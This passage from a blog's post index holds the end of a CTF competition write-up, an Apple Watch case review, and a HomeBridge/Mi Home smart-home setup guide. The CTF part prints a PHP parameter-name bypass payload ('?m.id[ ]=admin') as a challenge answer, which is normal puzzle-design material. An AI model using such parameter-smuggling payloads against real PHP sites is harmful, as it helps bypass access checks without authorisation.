RIgAfcJwOCCgYJHpgm2Ev3YTgwCZ1xrN23aFHsEYTxOjCETbQ3jqEmUGDCVWbNmxaxuU33qkQAJkAAJkAAJkEAm2hpGhhj241HLy0Tg7DfVw8r0JmOiDgmQAAmQAAmQQLAJZKqtYWSIdeva1fjoYd9+p/ojUEiABEiABEiABEjAlECm2hpJDbEKFSpI3bp1jTgiBJcJXI1QUYkESIAESIAESOA/BDLZ1khqiNlELyAfjVdJ8Hj2kgAJkAAJkAAJRINAJtsaCQ0xhMU2bNjQ+CgjKSCFBEiABEiABEiABEwJZLqtkdAQa6fJBPPmzWvEcuWqVbJek8JRSIAESIAESIAESMCUQKbbGgnziMHx3rTsxdq1a02ZU48ESIAESIAESIAEYgQy3dZIaIih3AEeFBIgARIgARIgARJwg0Cm2xoJtybdAM42SYAESIAESIAESIAEfiNAQ4xnAgmQAAmQAAmQAAn4RICGmE/g2S0JkAAJkAAJkAAJ0BDjOUACJEACJEACJEACPhGgIeYTeHZLAiRAAiRAAiRAAjTEeA6QAAmQAAmQAAmQgE8EaIj5BJ7dkgAJkAAJkAAJkAANMZ4DJEACJEACJEACJOATARpiPoFntyRAAiRAAiRAAiRAQ4znAAmQAAmQAAmQAAn4RICGmE/g2S0JkAAJkAAJkAAJJKw1STwkQAIkQALOEujZq5cUzMpK2ujOXbuS6lCBBEgg/ATyVKpc/kj4p8EZkAAJkAAJkAAJkED4CPw/BMmSSIdmMCsAAAAASUVORK5CYII=From the beginning, it is clear that this is a base64 compressed image. By pasting the above code directly into the browser‚Äôs address bar, you can get the URL with the answer. Enter the URL to pass the challenge!4. Breaking Through the BlockadeProblem Description: This problem immediately shows the PHP code. You need to find a way to bypass the condition using GET parameters to execute the setPassedCookie() method inside the else block.Solution: This is a commonly used but little-known PHP vulnerability, detailed as follows:Summary of Common PHP Vulnerabilities in CTFThe question has been slightly modified. The answer to this question is: ?m.id[ ]=admin5. The Test of Penetration, 6. The Test of Penetration 2These two questions are basic introductory XSS problems, so no further explanation will be given here.Since the solution is placed on the frontend, this uses a JS website that provides irreversible encryption: https://www.sojson.com/jsobfuscator.html(Although I‚Äôm not sure if it‚Äôs true, if there‚Äôs a way to crack it, let‚Äôs just consider it passed!)7. Moonlight Treasure BoxThis question is taken from a puzzle app and will not be shown here.SummaryThe competition system took about a week to build, and the questions took around three months to gradually gather (inspiration was needed). The competition has successfully concluded, and the feedback has been quite positive‚Äî‚Äùfun and enjoyable.‚Äù This was my original intention: to have everyone explore and brainstorm starting from a point of fun. Therefore, neither the question titles (which are all very cinematic) nor the question directions involve deep engineering or complex calculations, as that would be too rigid and not fun!Additionally, here is the question response rate for reference on difficulty:When creating the questions, the biggest fear was that they would be too easy and everyone would finish quickly, or too hard and everyone would get stuck. Both situations are awkward.The actual competition results (duration: 90 minutes) matched our expectations perfectly! It was neither too hard nor too easy. The first-place team solved 9 problems, while even the last-place team solved 7 problems. The scores were very close, but factors like time and hint purchases ultimately determined the final rankings! Surprisingly, no one has solved the entrance to the Magic Academy‚Ä¶ QQThe above is the complete summary of this engineering CTF competition.Addcn 2019 CTFFurther Reading Revealing a Clever Website Vulnerability Discovered a Few Years Ago The app uses HTTPS for transmission, but data was still stolen If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple Watch Protective CasesÔΩúCatalyst & Muvit Unboxing and Review", "url": "/posts/zrealm-life/apple-watch-protective-cases-catalyst-muvit-unboxing-and-review-a66ce3dc8bb9/", "categories": "ZRealm Life.", "tags": "english, ai-translation, lifestyle, unboxing, 3c, apple-watch, catalyst", "date": "2019-07-08 22:55:50 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Case Unboxing Experience (Catalyst &amp; Muvit)Catalyst Apple Watc...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Case Unboxing Experience (Catalyst &amp; Muvit)Catalyst Apple Watch Ultra-Thin Waterproof Case &amp; Muvit Apple Watch Protective Cover[Latest Update] Apple Watch Series 6 Unboxing &amp; Two-Year Usage Experience¬†¬ª&gt; Click Here Apple Watch Original Stainless Steel Milanese Loop Unboxing¬†¬ª Click Here Thanks to Men‚Äôs Game Áé©Áâ©Ë™å for providing the Apple Watch Series 4 protective case for testing.As a careless person with OCD, using a delicate product like the Apple Watch is very frustrating; being clumsy and careless makes it easy to accidentally bump it, and with OCD, any scratches are very upsetting. So, right after buying it, I immediately applied a full-coverage screen protector to prevent accidents.But actually, just applying a full-coverage screen protector is not enough. The watch itself has a curved surface, and the edges of the protector are fragile and can easily chip if the watch‚Äôs frame accidentally rubs against something:Full-screen protector edge chipping issue without a caseI have already replaced the full-screen protector three times; although the watch screen itself is not damaged, it still hurts my heart. Perfect fit + no impact on touch + thin + high transparency + no lifting edges = very expensive ($990 each). The money spent on protectors is almost enough for me to upgrade to the stainless steel version. Therefore, a protective case for the Apple Watch is very important to me, as it can enhance the protection of the watch‚Äôs frame and reduce damage from impacts.This article will review two Apple Watch cases, comparing their user experience, functionality, design, and suitable scenarios. Let‚Äôs get started!Left: Muvit Case / Right: Catalyst Case (with strap)p.s. My watch model is: Apple Watch Series 4 (GPS + Cellular), 44mm Space Gray Aluminum Case with Black Sport BandCatalyst Apple Watch Ultra-thin Waterproof Protective Case (with Strap)This case features an integrated design with a strap, providing full protection from wearing comfort to shock and water resistance.Unboxing and Usage:Front of the box100 meters waterproof / 360¬∞ all-around protection / 2-meter drop resistanceBack of the boxIP-68 waterproof rating, each product tested at a depth of 100 meters, US military-grade impact protection, direct screen operation, original voice call quality, charging directly through the case, heart rate detection directly through the case.IP-68 ( Wiki ):6 - Completely dustproof, no dust can enter, fully prevents contact.8 - Immersed in water over 1m.ContentsBesides the Catalyst Apple Watch case itself (containing a dummy model), a small screwdriver is included for easy installation.Protective Case (Including Strap) BodyBack of the case (including the strap) bodyComparison with Original Sports Band (L) (Left: Catalyst / Right: Original)Fixed Dowel JointCompared to the original sports strap (L), it has a similar length but with more holes, allowing for a better fit to wrist size; the fixed ring has a latch to ensure it won‚Äôt come off during intense exercise.Installation:We need to first disassemble the Catalyst case, then place the Apple Watch body inside before reassembling it. First, unscrew the screws on the back cover. After removing the screws, hold the watch strap with both hands and use your thumbs to push the watch case outward. Disassemble all componentsExploded view (taken from the official website) Remove the Apple Watch body from the current sports bandFlip to the back and press the rectangular latch below with your nail, then push it to the left or right! Place the Apple Watch body into the waterproof caseWhen installing, make sure the waterproof cover is properly fitted without any wrinkles to ensure waterproofing. Put on the protective case and attach the coverMake sure there are no wrinkles to avoid affecting the waterproofing. Reattach the watch strap body and tighten the screwsReattach the main body and tighten the screws (please be careful not to overtighten the screws!)Test: Charging can be directly attached:Test result: No issues, does not affect charging speed. Heart Rate:Left: With case / Right: Bare deviceTest result: No issues, does not affect heart rate detection. Display:Apple Watch 4 full-screen display without obstruction, no problem ‚úÖ Digital CrownCan be used normally ‚úÖ Audio Recording Impact:No significant difference ‚úÖ Appearance:Because I have big hands, I originally bought the largest 44mm version of the watch. After adding a protective case, it looks even more rugged and bold.Thoughts:This watch strap truly provides 360¬∞ full protection and enhances its waterproof capability to adapt to harsher environments.The strap uses the same skin-friendly material, feeling no different from the original sports strap. However, due to the denser holes for adjustment, it can be set to a more suitable size (with the original strap, I was stuck between a hole that was too loose and the next one too tight). Also, the clasp on the loop gives someone like me, who is a bit obsessive, more peace of mind!The overall look is wild and rugged, perfect for outdoor activities, hiking, climbing, and diving. This is exactly the scenario where this watch strap offers the greatest protection!Next time, remember to bring sunglasses; the sun is very strong.Catalyst family group photo ( AirPods cases )Muvit Apple Watch Protective CaseThe second product tested is the Muvit Apple Watch case. Compared to Catalyst‚Äôs professional protection, this one is simpler and more convenient, suitable for various daily life scenarios. That said, Muvit still passes the US military standard MIL-STD 810G 3-meter drop test, ensuring reliable safety protection!Unboxing and Usage:Front of the boxTwo different colored cases: Left - Black / Right - Light PurpleU.S. Military Standard MIL-STD 810G 3-Meter Drop Test, Ultra-Light 2.3GBack of the boxDual-layer protection, silicone shock-absorbing layer, polycarbonate cushioning system, protective screen bezelContentsCase body, black/light purpleInstallation: Installation is very simple. First, remove the Apple Watch body from the current sport band.Flip to the back, press the rectangular latch below with your fingernail, then push left or right! Place the Apple Watch device ‚Äúface down‚Äù into the protective case Reattach the watch band to complete!Completed:Black modelLight Purple VersionTry-on, Left: Black / Right: Light PurpleTest:Digital Crown:Works normally ‚úÖ. Other functions like audio recording, heart rate, display, etc., are not affected since this is just a bumper case, so no special testing was done!Thoughts:The best feature of this case is that I can easily and quickly switch straps according to different life scenarios (suit: leather strap, daily: sports strap). It‚Äôs easy to install and remove, and provides enough protection for all daily situations (doing housework, cleaning, moving things). I currently use this case for everyday life.Paired with leather watch strapsSummary:More than four months passed from receiving the trial to finishing this article. During this time, I experienced moving (Sorry‚Ä¶ the photos in this article are a bit messy), participated in a triathlon (10KM running + 40KM cycling), and went diving in Malaysia. These two cases have accompanied me through mountains and seas, running and jumping, and the full-screen protector remains flawless!Do you remember how many screen protectors I changed? The answer is 3 in 3 months. On average, each one gets damaged and chipped in less than a month for some reason. Each costs $990. Orz I can only say, I wish I had known earlier. If I had known about protective cases, I wouldn‚Äôt have wasted extra money!Both Catalyst and Muvit have solved my problem of screen protector edges chipping. If you don‚Äôt use a screen protector, you should definitely get a case to protect the screen corners, or else a cracked screen will be even more heartbreaking.The recommendation for choosing is: if you often engage in intense sports (rock climbing, diving) or manual labor, it is advisable to choose Catalyst for better protection; if you are a regular office worker, occasionally run, or like to change watch bands based on your mood, Muvit is sufficient!Here is a simple comparison table for your reference:Purchase: CATALYST FOR APPLE WATCH SERIES 4 44mm Ultra-Thin Waterproof Protective Case MUVIT Apple Watch Series4 (44mm) Shockproof Protective Case Chat:From the first full unboxing to after three months of use, it‚Äôs been almost a year since I started wearing the Apple Watch S4. There have been no major changes in usage; third-party apps are still few. The most used features remain Apple Pay, unlocking my Mac, and checking notifications. The Apple Watch has truly become part of my daily life, and I‚Äôve grown accustomed to its convenience. by the way, let‚Äôs look forward to Watch OS 6 together :)In the past six months, I have been more diligent in using the Apple Watch‚Äôs fitness features to track running and cycling time, routes, and heart rate. Beyond just recording data, the badges give you goals and a sense of achievement. Competing with friends or sharing results on social media makes exercising fun, which helps you stay consistent!Badges, Competitions, Workout Routes, Workout Status This article thanks Men‚Äôs Game Áé©Áâ©Ë™å for providing the Apple Watch Series 4 protective case for review.Further Reading[Latest Update] Apple Watch Series 6 Unboxing &amp; Two-Year Usage Experience¬†¬ª&gt; Click Here Apple Watch Original Stainless Steel Milanese Loop Unboxing¬†¬ª Click Here You‚Äôve already bought the watch, aren‚Äôt you considering the AirPods 2?Please see¬†¬ª AirPods 2 Unboxing and First ImpressionsIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple HomeKit & Xiaomi Mijia Smart Home SetupÔΩúStep-by-Step Guide for Beginners", "url": "/posts/zrealm-life/apple-homekit-xiaomi-mijia-smart-home-setup-step-by-step-guide-for-beginners-c3150cdc85dd/", "categories": "ZRealm Life.", "tags": "english, ai-translation, lifestyle, unboxing, 3c, mijia, homekit", "date": "2019-07-06 01:13:47 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!First Experience with Smart Home - Apple HomeKit &amp; Xiaomi MijiaMi Home Sma...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!First Experience with Smart Home - Apple HomeKit &amp; Xiaomi MijiaMi Home Smart Camera and Mi Home Smart Desk Lamp, HomeKit Setup Tutorial[2020/04/20] Advanced Guide Released :Experienced users please go directly here¬†¬ª Demo: Using Raspberry Pi as HomeBridge Host to Connect All Mijia Appliances to HomeKitChat:Recently moved to a new place; unlike the previous one, where the ceiling had office-style light fixtures so bright I had to unplug some tubes to make it comfortable for my eyes; the new place has decorative reflective lights, which feel a bit dim for using the computer or reading. After two weeks, my eyes feel drier and more uncomfortable. I initially planned to shop at IKEA, but considering light color and eye protection, I compared cost-performance and finally chose the Xiaomi desk lamp (also owning a Xiaomi smart camera before, both are Mi Home series products).This Article:Actually, I didn‚Äôt pay much attention to whether it supports Apple HomeKit when I was shopping. As an iOS developer, that‚Äôs quite unprofessional of me because I never expected Xiaomi to support it.This article will introduce Using Apple HomeKit, How to connect smart home devices that do not support Apple HomeKit via third-party integration, and How to build a smart home using Mi Home (with IFTTT).You can skip to the parts that match your device needs.Shopping:I bought two desk lamps in total: one (Pro) for my computer desk, and the other for bedside reading.Mi Home Desk Lamp Pro ÔºöNT$ 1,795 Supports Mi Home, Apple HomeKitMi Home LED Smart Desk Lamp ÔºöNT$ 995 supports only Mi Home.For detailed information, please refer to the official website. Both lamps support smart control, color changing, brightness adjustment, and eye protection. The Pro version supports Apple HomeKit and three-level angle adjustment. Based on current use, the functionality of a single lamp is quite satisfactory. The only drawback is that the Pro version‚Äôs angle adjustment allows only the base to rotate horizontally, not the lamp itself, which means you cannot adjust the light angle!Ideal Smart Home Goals:Current Devices: Mijia Smart Camera PTZ Version 1080P (Supported: Mijia) Mi Home Desk Lamp Pro (Supports: Apple HomeKit, Mi Home) Mi Home LED Smart Desk Lamp (Supports: Mi Home) Ideal Goals:When returning home: Automatically turn off the camera (for privacy and to prevent accidental triggering of the home alarm; the Mi Home app has a bug that prevents the home alarm from turning on/off as scheduled), turn on the Pro desk lamp (to avoid fumbling in the dark).When leaving home: Automatically turn on the camera (home monitoring enabled by default), turn off all lights.Final Achievements of This Article:Send push notifications when leaving or arriving home, and trigger actions with a tap on the phone (current devices cannot achieve the ideal automation).The Path to Smart Home Setup:Apple HomeKit Usage*Only for Mi Home Desk Lamp Pro! Mi Home Desk Lamp Pro! Mi Home Desk Lamp Pro!This is the simplest part because it all uses native features.Only Four Steps Find the Home app (if not installed, please search ‚ÄúHome‚Äù in the App Store and install it) Open the Home app Click the ‚Äú+‚Äù icon at the top right to add a nearby location Scan the HomeKit QR Code at the bottom of the Pro desk lamp to add the accessory! After successfully adding the accessory, press firmly (3D TOUCH) or long press on the accessory to adjust brightness and color.How to Use Third-Party Integration with Apple HomeKit for Smart Homes That Do NOT Support Apple HomeKit?Besides the smart devices that are natively supported, does that mean devices not supporting Apple HomeKit cannot be controlled through the Home app at all?This chapter will guide you step-by-step on how to add unsupported devices (cameras, regular desk lamps) to the Home app! Mac ONLY, Windows users please skip to the Mi Home section My device is MacOS 10.14/iOS 12Using HomeBridge ÔºöHomeBridge uses a Mac computer as a bridge to simulate unsupported devices as HomeKit accessories, allowing them to be added to the ‚ÄúHome‚Äù app.Operation ComparisonOne key point is you need to keep a Mac computer turned on to maintain a smooth bridging channel; once the computer is shut down or asleep, you won‚Äôt be able to control those HomeKit devices.Of course, some experts online use a Raspberry Pi as a bridge by buying one and setting it up themselves; however, this involves too much technical detail and will not be covered in this article.If you still want to try it after knowing the drawbacks, you can continue reading or skip to the next section about using Mijia directly.Step 1:Install node.js: Click here Download and install.Step 2:Open ‚ÄúTerminal‚Äù and entersudo npm -vCheck if the node.js npm package manager is installed successfully: displaying the version number means success!Step 3:Install the HomeBridge package via npm:sudo npm -g install homebridge --unsafe-permAfter the installation is complete‚Ä¶ the HomeBridge tool is ready to use!Earlier, it was mentioned that ‚ÄúHomeBridge uses a Mac computer as a bridge to simulate unsupported devices as HomeKit devices.‚Äù In fact, HomeBridge is just a platform, and each device requires separate HomeBridge plugins to be added.It‚Äôs easy to find resources by searching ‚Äúmija product English name homebridge‚Äù on Google or GitHub; here are two device resources I use:1. Mijia Camera PTZ Version Resources: MijiaCameraCameras are more complex devices, so I spent some time researching and organizing information; I hope this helps those in need!First, use the ‚ÄúTerminal‚Äù to run the command to install the MijiaCamera npm package.sudo npm install -g homebridge-mijia-cameraAfter installation, we need to obtain two pieces of information from the camera: the network IP address and the Token.Open the Mi Home app ‚Üí Camera ‚Üí Top right corner ‚Äú‚Ä¶‚Äù ‚Üí Settings ‚Üí Network info to get the IP address!Token information is more complicated and requires you to connect your phone to your Mac:Open the iTunes interfaceSelect backup Do NOT check Encrypt local backup, then click ‚ÄúBack Up Now‚ÄùAfter the backup is complete, download and install the backup viewer software: iBackupViewerOpen ‚ÄúiBackupViewer.‚Äù On first launch, it will ask you to go to Mac ‚ÄúSystem Preferences‚Äù - ‚ÄúSecurity &amp; Privacy‚Äù - ‚ÄúPrivacy‚Äù - ‚Äú+‚Äù - add ‚ÄúiBackupViewer.‚Äù**If you have privacy concerns, you can disable network access for this software and remove it after use*After reopening ‚ÄúiBackupViewer‚Äù and successfully loading the backup file, click the top right corner to switch to ‚ÄúTree View‚Äù mode.The left side will show all your installed apps. Find the Mi Home app ‚ÄúAppDomain-com.xiaomi.mihome‚Äù -&gt; ‚ÄúDocuments‚ÄùFind and select the file ‚ÄúÊï∏Â≠ó_mihome.sqlite‚Äù in the document list on the right side.Click the top right ‚ÄúExport‚Äù -&gt; ‚ÄúSelected‚ÄùUpload the exported SQLite file to https://inloop.github.io/sqlite-viewer/ to view its contents.You can see all device information fields on the Mi Home app. Scroll right to the end, find the ZTOKEN field, double-click to edit, select all, and copy.Finally, open the website http://aes.online-domain-tools.com/ to convert ZTOKEN into the final Token. Paste the copied ZTOKEN into ‚ÄúInput Text‚Äù and select ‚ÄúHex‚Äù. Enter the key ‚Äú00000000000000000000000000000000‚Äù (32 zeros) and also select ‚ÄúHex‚Äù. Then click ‚ÄúDecrypt!‚Äù to convert. Select all, copy the text in the blue box at the bottom right, and remove spaces to get the Token we need. Here, I tried to directly sniff the token using ‚Äúmiio,‚Äù but it seems the Mijia camera firmware has been updated, and this method no longer quickly and easily obtains the token!Back to HomeBridge! Editing the config.json fileUse ‚ÄúFinder‚Äù -&gt; ‚ÄúGo‚Äù -&gt; ‚ÄúGo to Folder‚Äù -&gt; enter ‚Äú~/.homebridge‚Äù to navigate.Open ‚Äúconfig.json‚Äù with a text editor. If the file does not exist, create one or click here to download and place it directly inside.{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}Add the above content to config.json, inserting the IP and Token obtained earlier.At this point, return to the ‚ÄúTerminal‚Äù and run the following command to start HomeBridge.sudo homebridge startIf you have already started and then changed the content of config.json, you can modify it as follows:sudo homebridge restartRestartAt this point, a HomeKit QRCode will appear for you to scan and add the accessory (the steps are as mentioned above for adding Apple HomeKit devices).The following status messages will also appear:[2019‚Äì7‚Äì4 23:45:03] [Mi Camera] connecting to camera at 192.168.0.100‚Ä¶[2019‚Äì7‚Äì4 23:45:03] [Mi Camera] current power state: offThe appearance of these and no error messages means the setup was successful!Common errors usually involve incorrect tokens. Just check if any steps in the above process were missed.You can now turn your Mi Home smart camera on and off from the ‚ÄúHome‚Äù app!2. Mi Home LED Smart Desk Lamp HomeBridge Resource: homebridge-yeelight-wifiNext is the Mi Home LED Smart Desk Lamp. Since it doesn‚Äôt support Apple HomeKit like the Pro version, we still need to add it using HomeBridge. Although the steps do not require the complicated process of obtaining IP and Token, making it simpler than cameras, the desk lamp has its own quirks. You need to pair it with another YeeLight app and enable local network control:I have to complain about this poor integration. The native Mi Home app cannot perform this setting; so please search for the ‚ÄúYeelight‚Äù app on the App Store to download and install it.Open the app -&gt; Log in directly with your Mi Home account -&gt; Add device -&gt; Mi Home Desk Lamp -&gt; Follow the instructions to rebind the desk lamp to the Yeelight appAfter completing device binding, go back to the ‚ÄúDevices‚Äù page -&gt; tap ‚ÄúMi Home Desk Lamp‚Äù to enter -&gt; tap the ‚Äú‚ñ≥‚Äù tab at the bottom right -&gt; enter ‚ÄúLAN Control‚Äù settings -&gt; turn on the switch to allow LAN (Local Area Network) control.The desk lamp setup is complete. You can keep using this app to control the lamp or rebind it to the Mi Home app.Next is the HomeBridge setup; first, open the ‚ÄúTerminal‚Äù and run the command to install the homebridge-yeelight-wifi npm packagesudo npm install -g homebridge-yeelight-wifiAfter installation, follow the same camera steps and go to the ~/.homebridge folder. Create or edit the config.json file, and this time, just add the following inside the last }\"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]Got it!Finally, combine the above camera config.json file as follows:{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\" }, \"accessories\": [ { \"accessory\": \"MijiaCamera\", \"name\": \"Mi Camera\", \"ip\": \"\", \"token\": \"\" } ], \"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]}Then, go back to the ‚ÄúTerminal‚Äù:sudo homebridge startorsudo homebridge restartYou can now see the previously unsupported Mi Home LED Smart Desk Lamp added to the HomeKit ‚ÄúHome‚Äù app!Supports color and brightness adjustments as well!All HomeKit accessories are set up, how to make them smart?After connecting everything properly, open the ‚ÄúHome‚Äù app as usual.Add a scenario following the steps; here, ‚ÄúGoing Home‚Äù is used as an example:Tap the ‚Äú+‚Äù at the top right -&gt; Add Scene -&gt; Custom -&gt; Enter the accessory name (e.g., Home) -&gt; Tap ‚ÄúAdd Accessories‚Äù below -&gt; Select the connected HomeKit accessories -&gt; Set the accessory status for this scene (Camera: Off / Desk Lamp: On) -&gt; Tap ‚ÄúTest Scene‚Äù to test -&gt; Tap ‚ÄúDone‚Äù at the top right!The setup is complete! Now, tap ‚ÄúScene‚Äù on the homepage to execute all the accessory settings inside!Another quick tip is to swipe up the control center and tap the house-shaped button to quickly operate HomeKit/execute scenes (you can switch modes at the top right)!With intelligence in place, how to automate?The intelligence is already in place. Now I want to achieve the ultimate goal: automatically turn off the camera and turn on the lights when I get home; automatically turn on the camera and turn off the lights when I leave home.Switch to the third tab ‚ÄúAutomation‚Äù to set it up. Sorry, none of the devices mentioned above (iPad/Apple TV/HomePod) can act as a ‚Äù Home Hub ‚Äù, so I did not explore this area.The principle seems to be that when you return home, detecting the ‚Äúhome hub‚Äù phone/watch can accurately trigger the action!Here I found a tricky method: (GPS sensing)Using third-party apps to integrate with ‚ÄúHome‚Äù and add automation settings allows you to bypass restrictions on using the ‚ÄúAutomation‚Äù tab by leveraging your phone‚Äôs GPS location for automation.p.s GPS may have an error margin of about 100 metersHere, the third-party integrated app I use is: myHome PlusAfter downloading and installing, open the app -&gt; allow access to ‚ÄúHome Data‚Äù -&gt; you will see the ‚ÄúHome‚Äù data configuration -&gt; tap the ‚ÄúSettings‚Äù button at the top right -&gt; tap ‚ÄúMy Home‚Äù to enter-&gt; scroll down to the ‚ÄúTriggers‚Äù section -&gt; tap ‚ÄúAdd Trigger‚ÄùSelect the trigger type as ‚ÄúLocation‚Äù -&gt; Enter a name (e.g., Home) -&gt; Click ‚ÄúSet Location‚Äù to set the area -&gt; Then, under REGION STATUS, choose whether entering or leaving the area triggers it -&gt; Finally, under SCENES, select the corresponding ‚Äúscene‚Äù to execute (created above)After tapping ‚ÄúDone‚Äù at the top right to save, go back to the ‚ÄúHome‚Äù app, and you will see the ‚ÄúAutomation‚Äù tab is enabled and ready to use!At this point, you can choose the ‚Äú+‚Äù at the top right to directly add an automation script using the ‚ÄúHome‚Äù app!!The steps are similar to third-party apps but with better integration! After creating automation with the native ‚ÄúHome‚Äù app, you can also swipe to delete the ones made with third-party apps. !! Just make sure to keep at least one item; otherwise, the Tab will revert to its original locked state!!Siri Voice Control Section:Compared to the Mi Home introduced below, HomeKit offers much higher integration, allowing direct voice control of configured accessories and scene execution without any additional setup.This concludes the introduction to HomeKit settings. Next, let‚Äôs explain how to use the native Mi Home smart system.How to Build a Smart Home Using Mijia Itself:Here is a confusing point: I couldn‚Äôt find the exact same Mi Home desk lamp when adding a device in the Mi Home app. The answer is:Just read the text, this is it.Other devices: For cameras and Pro desk lamps, just follow the official instructions to set them up and add them. No further details will be provided here.Scenario Setting:Same as ‚ÄúFamily Setup‚Äù -&gt; Switch to the ‚ÄúSmart‚Äù Tab -&gt; Select ‚ÄúManual Execution‚Äù -&gt; Choose device actions below (more features available since it‚Äôs native) -&gt; Continue adding other devices (desk lamp) -&gt; ‚ÄúSave‚Äù to complete! Someone will definitely ask why not just choose ‚ÄúLeave or Arrive at a Location‚Äù? Because this feature is basically useless. The app is not optimized for GPS in Taiwan, and its positioning can only be set to landmarks. If your location matches, you can use this feature directly. You can skip the rest of the article! Trivia: The China Map in Google Maps Is Completely Wrong!For quick toggles, you can set up widgets from ‚ÄúMy‚Äù -&gt; ‚ÄúWidgets‚Äù!This allows you to quickly execute scenes and devices from the Notification Center!You can also control components from the Apple Watch!If the watch app keeps showing a blank screen, please delete and reinstall the watch or phone app, as this app has quite a few bugs.With intelligence in place, how do we automate?Here, you still need to use the GPS sensing method. If the new scene mentioned above uses ‚Äúleaving or arriving at a location,‚Äù you can skip the following settings![2019/09/26] Update iOS ‚â• 13 to Achieve Automation Using Only the Built-in Shortcuts App:iOS ‚â• 13.1 Use the ‚ÄúShortcuts‚Äù automation feature with Mi Home smart devices, click to view¬†¬ª iOS ‚â• 12, iOS &lt; 13 Only : Using the Built-in Shortcuts App with IFTTTFirst go to ‚ÄúMe‚Äù -&gt; ‚ÄúLab Features‚Äù -&gt; ‚ÄúiOS Shortcuts‚Äù -&gt; ‚ÄúAdd Mijia Scene to Shortcut‚ÄùOpen the built-in ‚Äú Shortcuts ‚Äú app (if you can‚Äôt find it, search and download it from the App Store).Click the ‚Äú+‚Äù at the top right to create a shortcut -&gt; Tap the ‚ÄúDone‚Äù button in the top right after setting below -&gt; Name -&gt; Enter a name (English is recommended, as it will be used later)Return to the Add Shortcut page -&gt; enter ‚ÄúMi Home‚Äù in the bottom menu search -&gt; add the corresponding scene set in Mi Home, then turn off ‚ÄúShow When Run‚Äù to prevent Mi Home app from opening after execution. *If you cannot find Mi Home, please return to the Mi Home app and try toggling ‚ÄúMe‚Äù -&gt; ‚ÄúLab Features‚Äù -&gt; ‚ÄúiOS Shortcuts‚Äù -&gt; ‚ÄúAdd Mi Home Scenes to Shortcuts,‚Äù then close and reopen the Shortcuts app.At this point, we need to use a third-party app. We use IFTTT for GPS-based background triggers for entering and leaving locations. Search for ‚ÄúIFTTT‚Äù in the App Store to download and install it.Open IFTTT and log in. Switch to the ‚ÄúMy Applets‚Äù tab, then click the ‚Äú+‚Äù icon in the top right to add a new applet.Click ‚Äú+this‚Äù -&gt; search for ‚ÄúLocation‚Äù -&gt; choose either entering or leaving.Set location -&gt; Click ‚ÄúCreate trigger‚Äù to confirm -&gt; Then click the ‚Äú+that‚Äù below -&gt; Search for ‚Äúnotification‚ÄùChoose ‚ÄúSend a rich notification from the IFTTT app‚Äù:Title = Notification Title, Message = Notification ContentLink URL please enter: shortcuts://run-shortcut?name= Shortcut NameThat‚Äôs why it‚Äôs better to name shortcuts in English whenever possible.-&gt; Click ‚ÄúCreate action‚Äù -&gt; You can click ‚ÄúEdit title‚Äù to set the name-&gt; ‚ÄúFinish‚Äù saved successfully!The next time you leave or enter the set area, you will receive a triggered notification (with about a 100-meter margin of error). Tapping the notification will automatically execute the Mi Home scene!Clicking the notification will automatically run the scene in the backgroundSiri Voice Control Section:Since Mi Home is not a built-in Apple app, supporting Siri voice control requires additional setup:In the ‚ÄúIntelligence‚Äù Tab -&gt; ‚ÄúAdd to Siri‚Äù -&gt; Select ‚ÄúTarget Scenario‚Äù and press ‚ÄúAdd to Siri‚Äù-&gt; Tap the red record button (e.g., turn off the light) -&gt; Done!You can directly call and control the execution of scenes in Siri!SummaryThe lengthy setup steps above can be summarized as follows:For a good experience, you have to spend a lot of money on appliances with the HomeKit logo (so you don‚Äôt need to keep a Mac running as a HomeBridge server; they integrate perfectly with Apple‚Äôs native Home app). You also need to buy a HomePod, Apple TV, or iPad to serve as the home hub. Both HomeKit-certified appliances and home hubs are expensive!If you have technical skills, consider using third-party smart devices (such as Mi Home) with a Raspberry Pi to set up HomeBridge.If you are an ordinary user like me, it‚Äôs still easiest to use Mi Home. My current habit is to execute scene operations from the notification center‚Äôs quick widget when I arrive or leave home. The Shortcuts app combined with IFTTT is only used for notification reminders, in case I sometimes forget.Although the current experience has not reached the ideal goal, it is already a step closer to ‚ÄúSmart Home‚Äù!Advanced SectionDemo: 